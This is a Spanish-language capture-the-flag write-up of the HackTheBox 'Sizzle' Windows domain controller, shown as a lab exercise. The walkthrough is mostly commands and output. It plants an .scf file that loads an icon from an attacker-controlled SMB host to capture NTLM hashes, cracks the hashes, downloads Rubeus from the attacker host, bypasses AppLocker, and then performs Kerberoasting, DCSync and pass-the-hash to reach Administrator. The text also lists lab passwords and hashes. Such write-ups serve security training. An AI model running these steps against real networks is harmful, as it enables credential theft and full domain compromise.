---
title: "Sizzle"
date: 2024-07-22
cover: images/sizzle.png
tags: ["Insane"]
categories:
    - "hackthebox"
---

## Reconocimiento

### Nmap

Escaneamos la maquina para ver que puertos tiene abiertos:

```shell
nmap -p- --open --min-rate 5000 -Pn -n 10.10.11.8
```

```
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
5986/tcp  open  wsmans
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49690/tcp open  unknown
49691/tcp open  unknown
49692/tcp open  unknown
49699/tcp open  unknown
49700/tcp open  unknown
49719/tcp open  unknown
49721/tcp open  unknown
```

### FTP 

Probamos a entrar con el usuario anonymous:

```
ftp 10.10.10.103
```

Nos deja entrar pero no vemos nada

### HTTPS

En la web vemos un gif:

![](img/bacon.png)

Vamos a hacer fuzzing para ver si hay mas direcorios:

```
> gobuster dir -k -u https://10.10.10.103 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -t 20

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.103
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client/       (Status: 403) [Size: 1233]
/certsrv/mscep_admin  (Status: 401) [Size: 1293]
/certenroll/          (Status: 403) [Size: 1233]
/certsrv/             (Status: 401) [Size: 1293]
/certsrv/mscep/mscep.dll (Status: 401) [Size: 1293]
/images/              (Status: 403) [Size: 1233]
Progress: 211 / 212 (99.53%)
===============================================================
Finished
===============================================================
```

Vemos que hay un directorio `certsrv` el cual no tenemos permiso pero puede ser interesante si encontramos credenciales
### SMB

Vamos a enumerar los recursos comaprtidos con smbmap:

```
> smbmap -H 10.10.10.103 -u "null"

[+] Guest session   	IP: 10.10.10.103:445	Name: 10.10.10.103                                      
    Disk                    	Permissions	Comment
	----                    	-----------	-------
	ADMIN$              	NO ACCESS	Remote Admin
	C$                  	NO ACCESS	Default share
	CertEnroll          	NO ACCESS	Active Directory Certificate Services share
	Department Shares   	READ ONLY	
	IPC$                	READ ONLY	Remote IPC
	NETLOGON            	NO ACCESS	Logon server share 
	Operations          	NO ACCESS	
	SYSVOL              	NO ACCESS	Logon server share
```

Tenemos permiso de lectura en el directorio `Department Shares`, ahí dentro encontraremos otro llamado `users` donde podemos ver un listado de posibles usuarios:

```
> smbmap -H 10.10.10.103 -u "null" -r Department\ Shares/Users

[+] Guest session   	IP: 10.10.10.103:445	Name: 10.10.10.103                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Department Shares                                 	READ ONLY	
	.\Department SharesUsers\*
	dr--r--r--                0 Tue Jul 10 23:39:32 2018	.
	dr--r--r--                0 Tue Jul 10 23:39:32 2018	..
	dr--r--r--                0 Mon Jul  2 21:18:43 2018	amanda
	dr--r--r--                0 Mon Jul  2 21:19:06 2018	amanda_adm
	dr--r--r--                0 Mon Jul  2 21:18:28 2018	bill
	dr--r--r--                0 Mon Jul  2 21:18:31 2018	bob
	dr--r--r--                0 Mon Jul  2 21:19:14 2018	chris
	dr--r--r--                0 Mon Jul  2 21:18:39 2018	henry
	dr--r--r--                0 Mon Jul  2 21:18:34 2018	joe
	dr--r--r--                0 Mon Jul  2 21:18:53 2018	jose
	dr--r--r--                0 Tue Jul 10 23:39:32 2018	lkys37en
	dr--r--r--                0 Mon Jul  2 21:18:48 2018	morgan
	dr--r--r--                0 Mon Jul  2 21:19:20 2018	mrb3n
	dr--r--r--                0 Wed Sep 26 07:45:32 2018	Public
```

Nos guardamos este listado:

Este comando nos servirá para que nos devuelva solo el nombre de los usuarios y así poder enviarlos a un archivo mas cómodamente

```shell
smbmap -H 10.10.10.103 -u "null" -r Department\ Shares/Users | awk '{print $NF}' | tail -n +8
```

```shell
> smbmap -H 10.10.10.103 -u "null" -r Department\ Shares/Users | awk 
'{print $NF}' | tail -n +8

amanda
amanda_adm
bill
bob
chris
henry
joe
jose
lkys37en
morgan
mrb3n
Public
┌─[fouen@parrot]─[~/htb/sizzle]
└──╼ $touch users
┌─[fouen@parrot]─[~/htb/sizzle]
└──╼ $smbmap -H 10.10.10.103 -u "null" -r Department\ Shares/Users | awk '{print $NF}' | tail -n +8 > users
```

Vamos a crearnos una montura en el directorio `Department Shares` para poder movernos mejor:

```
mkdir /mnt/montura
```

```
sudo mount -t cifs "//10.10.10.103/Department Shares" /mnt/montura -o username=null,password=
```

Ya con la montura hacemos un `tree` para ver rápidamente lo que hay:

```
> tree
.
├── Accounting
├── Audit
├── Banking
│   └── Offshore
│       ├── Clients
│       ├── Data
│       ├── Dev
│       ├── Plans
│       └── Sites
├── CEO_protected
├── Devops
├── Finance
├── HR
│   ├── Benefits
│   ├── Corporate Events
│   ├── New Hire Documents
│   ├── Payroll
│   └── Policies
├── Infosec
├── Infrastructure
├── IT
├── Legal
├── M&A
├── Marketing
├── R&D
├── Sales
├── Security
├── Tax
│   ├── 2010
│   ├── 2011
│   ├── 2012
│   ├── 2013
│   ├── 2014
│   ├── 2015
│   ├── 2016
│   ├── 2017
│   └── 2018
├── Users
│   ├── amanda
│   ├── amanda_adm
│   ├── bill
│   ├── bob
│   ├── chris
│   ├── henry
│   ├── joe
│   ├── jose
│   ├── lkys37en
│   ├── morgan
│   ├── mrb3n
│   └── Public
└── ZZ_ARCHIVE
    ├── AddComplete.pptx
    ├── AddMerge.ram
    ├── ConfirmUnprotect.doc
    ├── ConvertFromInvoke.mov
    ├── ConvertJoin.docx
    ├── CopyPublish.ogg
    ├── DebugMove.mpg
    ├── DebugSelect.mpg
    ├── DebugUse.pptx
    ├── DisconnectApprove.ogg
    ├── DisconnectDebug.mpeg2
    ├── EditCompress.xls
    ├── EditMount.doc
    ├── EditSuspend.mp3
    ├── EnableAdd.pptx
    ├── EnablePing.mov
    ├── EnableSend.ppt
    ├── EnterMerge.mpeg
    ├── ExitEnter.mpg
    ├── ExportEdit.ogg
    ├── GetOptimize.pdf
    ├── GroupSend.rm
    ├── HideExpand.rm
    ├── InstallWait.pptx
    ├── JoinEnable.ram
    ├── LimitInstall.doc
    ├── LimitStep.ppt
    ├── MergeBlock.mp3
    ├── MountClear.mpeg2
    ├── MoveUninstall.docx
    ├── NewInitialize.doc
    ├── OutConnect.mpeg2
    ├── PingGet.dot
    ├── ReceiveInvoke.mpeg2
    ├── RemoveEnter.mpeg3
    ├── RemoveRestart.mpeg
    ├── RequestJoin.mpeg2
    ├── RequestOpen.ogg
    ├── ResetCompare.avi
    ├── ResetUninstall.mpeg
    ├── ResumeCompare.doc
    ├── SelectPop.ogg
    ├── SuspendWatch.mp4
    ├── SwitchConvertFrom.mpg
    ├── UndoPing.rm
    ├── UninstallExpand.mp3
    ├── UnpublishSplit.ppt
    ├── UnregisterPing.pptx
    ├── UpdateRead.mpeg
    ├── WaitRevoke.pptx
    └── WriteUninstall.mp3
```

## Explotación

Al ser una montura de un smb tiene unas acl especificas que aunque seamos root tenemos los permisos que nos asignan, estos podemos verlos usando `smbcacls` :

```
> smbcacls "//10.10.10.103/Department Shares" Users/amanda -N

REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:HTB\Domain Users
ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ
ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL
```

Podemos ver que en Everyone (nosotros) tenemos permiso `READ`, vamos a buscar uno que nos de permisos para poder escribir:

```
> for directory in $(ls); do echo -e "\n$directory"; echo "$(smbcacls "//10.10.10.103/Department Shares" Users/$directory -N | grep Everyone)"; done

amanda
ACL:Everyone:ALLOWED/OI|CI|I/READ

amanda_adm
ACL:Everyone:ALLOWED/OI|CI|I/READ

bill
ACL:Everyone:ALLOWED/OI|CI|I/READ

bob
ACL:Everyone:ALLOWED/OI|CI|I/READ

chris
ACL:Everyone:ALLOWED/OI|CI|I/READ

henry
ACL:Everyone:ALLOWED/OI|CI|I/READ

joe
ACL:Everyone:ALLOWED/OI|CI|I/READ

jose
ACL:Everyone:ALLOWED/OI|CI|I/READ

lkys37en
ACL:Everyone:ALLOWED/OI|CI|I/READ

morgan
ACL:Everyone:ALLOWED/OI|CI|I/READ

mrb3n
ACL:Everyone:ALLOWED/OI|CI|I/READ

Public
ACL:Everyone:ALLOWED/OI|CI/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ
```

### Evil scf

Vemos que `Public` tiene permisos de escritura

Vamos a probar a cargar un archivo `.scf` malicioso:

Primero nos creamos un recurso compartido:

```
imapcket-smbserver smbFolder $(pwd) -smb2support
```

Ahora en la montura en el directorio `/mnt/montura/Users/Public` creamos un archivo `evil.scf` con este contenido:

```
[Shell]
Command=2
IconFile=\\10.10.14.15\smbFolder\icon.ico
[Taskbar]
Command=ToggleDesktop
```

> **Explicación:**
> Al crear un archivo `.scf` que carga un icono desde un servidor SMB controlado por el atacante, cualquier usuario que visualice ese archivo enviará automáticamente una petición al servidor SMB, permitiendo al atacante capturar el hash NTLM del usuario


```
> sudo !!

sudo impacket-smbserver smbFolder $(pwd) -smb2support
[sudo] contraseña para fouen: 
Impacket v0.12.0.dev1+20240718.115833.4e0e3174 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.103,63200)
[*] AUTHENTICATE_MESSAGE (HTB\amanda,SIZZLE)
[*] User SIZZLE\amanda authenticated successfully
[*] amanda::HTB:aaaaaaaaaaaaaaaa:0d98dea6f3b011fbe93d619d8178d50f:01010000000000000061099728dbda01afc624fcf945efd400000000010010005300620079004600640057006a005900030010005300620079004600640057006a005900020010004f007500550068006400520047007900040010004f007500550068006400520047007900070008000061099728dbda010600040002000000080030003000000000000000010000000020000037cb1a51a52c616db4fba8e2e23cb35a88cedc334240d42681703dc2f6b112280a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003500000000000000000000000000
```

Desencriptamos el hash:

```
> john -w:/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ashare1972       (amanda)     
1g 0:00:00:05 DONE (2024-07-21 06:56) 0.1821g/s 2079Kp/s 2079Kc/s 2079KC/s Ashiah08..Armani3
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Ya tenemos unas credenciales, vamos a verificar estas credenciales y ver si podemos ganar acceso a la máquina

```
> crackmapexec smb 10.10.10.103 -u "Amanda" -p "Ashare1972"

SMB         10.10.10.103    445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.103    445    SIZZLE           [+] HTB.LOCAL\Amanda:Ashare1972
```

La contraseña es válida, vamos a probar en `winrm` para ver si directamente podemos ganar acceso al sistema con `evil-winrm`:

```
> crackmapexec winrm 10.10.10.103 -u "Amanda" -p "Ashare1972"

SMB         10.10.10.103    5986   SIZZLE           [*] Windows 10.0 Build 14393 (name:SIZZLE) (domain:HTB.LOCAL)
HTTP        10.10.10.103    5986   SIZZLE           [*] https://10.10.10.103:5986/wsman
HTTP        10.10.10.103    5986   SIZZLE           [-] HTB.LOCAL\Amanda:Ashare1972  'The server did not response with one of the following authentication methods Negotiate, Kerberos, NTLM - actual: '''
```

De momento no podemos entrar

### AD Certificate Services

Como habíamos visto antes había una página que no teníamos permiso, vamos a probar estas credenciales ahí a ver si ya nos deja:

![](img/certsrv.png)

Ya nos deja entrar, aquí podemos crear un certificado privado si le proporcionamos nuestro `csr`:

![](img/cert.png)

Creamos nuestras claves:

```
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
```

Ponemos el `.csr` e la web y nos devuelve el certificado que podremos usar para entrar al usuario mediante `evil-winrm` ya que la conexión es a través de SSL:

```
evil-winrm -S -c ../certnew.cer -k amanda.key -i 10.10.10.103 -u "Amanda" -p "Ashare1972"
```

## Escalada de privilegios

### Bloodhound

Ya tenemos acceso, ahora vamos a ejecutar `bloodhound` para enumerar mejor el sistema:

Esto nos creara unos archivos `.json`

```
bloodhound-python -c all -u "Amanda" -p "Ashare1972" -ns 10.10.10.103 -d HTB.LOCAL
```

Necesitamos tener `neo4j`

```shell
neo4j console
```

Ahora ya ejecutamos `bloodhound` y cargamos los `.json`

Mirando el `bloodhound` vemos varias cosas:

1. La cuenta `MRLKY` es kerberoasteable

![](img/kerb.png)

2. Esa misma cuenta puede efectuar ataques `DCSync`:


![](img/dcsync.png)

### Rubeus

Vamos a usar [rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

Nos lo pasamos a la máquina:

1. Creamos un servidor en python donde tengamos alojado el `.exe`

```
python3 -m http.server 80
```

2. Lo descargamos en la máquina víctima

```
iwr -uri http://10.10.14.15/Rubeus.exe -Outfile Rubeus.exe
```

No nos deja ejecutar `rubeus` debe haber algún `AppLocker` por detrás, voy a probar ejecutarlo desde la ruta `C:\Windows\system32\spool\drivers\color` que suele estar excluida de las políticas de los `AppLocker`:

```
*Evil-WinRM* PS C:\Windows\system32\spool\drivers\color> .\Rubeus.exe 

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0
```

Ya nos va

Vamos a hacer el ataque:

```
.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
```

```
$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$0DFF2356EAD2BE0B464459A027F75831$FF74BF3A310FB1BB026E6E45A703D181C2CA019966012D65652584963B4DD1633A92409BE0EECA6B0D445316B5347CFD9BA2E2AD55CC523C260446B9E6D7C6A44C654C2D358379295D88BCCF36D40B80C53A4E3573BC0D21BD64A5E2FF2A7F79811B5A6E96EAC876E4FA49BF8D2EB4EBBC1B9C43A760B7799877F6EA711B5769B1ED4A8E2607CB10DCACFB685724854BD951B7F2362D76BB4EB5C585668F1E7B1C435F96E1C252FFACEBE4844C127DD725210BD1FAB9637D0D6DCD69CA39F6AA9DD30A0984F7F1EC407E6FDB7C8D5D2B7310F9C7777BE54AC072D826AA251BAF95424EF33546E951E075D6BF93990A3DAEDD73EACC42C1A0E4EF4E832BE71155E4543B312CEA6CFAE1BC40ED34781AA3DF6171ABB883C77D31CFCF7BB3A2A167B7DE11DC217AB4800FF6BF146523823A240BAF000A23B567534FE5417D9AE95D1D707CF51F90CF3A3BDCF3CE985281ABC7073AE7405D3CD2A87A217FA0644E2085C2CC19709805B44FA8FF184EDB9B746C229AAF471D6CDD68F95171663B674626B5F0E86839B920743FEADE151BD292105DC4E4D767D16CFC048DAA69B7E5610B3ED3C9B68CBB23F631BE63C9B4A9634431194C55371E49B4D7AA86DE1566B6079E018CC239B8C613345401DB09A74ACC66C0FC81C4DB068606653A2B83D583666EE92E3A16DC01D67C2CDE0029F45689874C3A4D26C045BE74C135B1BA79BAC2BDDB77FE70B46133EDF355260A0B634B716B9A4F6C1133DC22E155835E73FA046A0B2EAE0A6DD6C30E8B0328284824ACBE14EB5E2FD590ACA69BE35CCE924792B7AB42988154C680BE0F7E6939F956BEE4DA8F4AEA8417E105F4650E04DB7A0C17C98E91AFA299CEB5574BA2BC16F6ECF5F0D054D696782188DF7FCC9351E68AD63525B440BBD96B17831409ED6E0F5A15321EEA424AF869CB63DF2A27E537C4EE986AE7DC9B51310512B378801E8D02BF5ECB6A3E60110D0A79D01F5858FC82CAE75EC412ACCAE293EEF7194CC97035A1E7C307B4319975E527A6B7FBB77142640708FD56290B331A25DE6D04DE2C922786497F063BC8780FAE2D68204B205573FE57386A94D3169718D558063F659CD9AD9FF16564749EB9CD926E01CA9C3ECF22F401814A20EA87DDD65B4740F97035A38DCE34A3EB5504FC6241BF3EF292DE2A023677FD84BB69DAC54D0EB4282E5B4AE22A25026A3CFB7696736F5D0EE3C8018CF3FFC279428F412DDC580D963A33E0540760176A93BB3DD8181291F2B3AE44B88830EDDC59B4BB601DE181A897FB07D10EEF46DE7938141ACD556FF733E971270D73BB09F3FBCBD943D9F836E2DA052DD907647E3F46121EC7259B0FEFB351217047
```

Lo desencriptamos:

```
> john -w:/usr/share/wordlists/rockyou.txt hash.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Football#7       (?)     
1g 0:00:00:07 DONE (2024-07-22 06:42) 0.1404g/s 1568Kp/s 1568Kc/s 1568KC/s Forever3!..Flygurl09
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

La contraseña es `Football#7` 

Como habíamos visto antes el usuario `mrlky` podía efectuar un `DCSync Attack`, como ya tenemos su contraseña vamos a probar de hacerlo:

```
impacket-secretsdump HTB.LOCAL/mrlky@10.10.10.103
```

```
impacket-secretsdump HTB.LOCAL/mrlky@10.10.10.103
Impacket v0.12.0.dev1+20240718.115833.4e0e3174 - Copyright 2023 Fortra

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:932207b6d3f0d1360a0108045198e58d:::
```

Ya tenemos el hash de todos los usuarios, vamos a hacer `Pass the Hash` para entrar como `Administrator` mediante `wmiexec.py`:

```
> wmiexec.py HTB.LOCAL/Administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267

Impacket v0.12.0.dev1+20240718.115833.4e0e3174 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator
```

Ya somos root!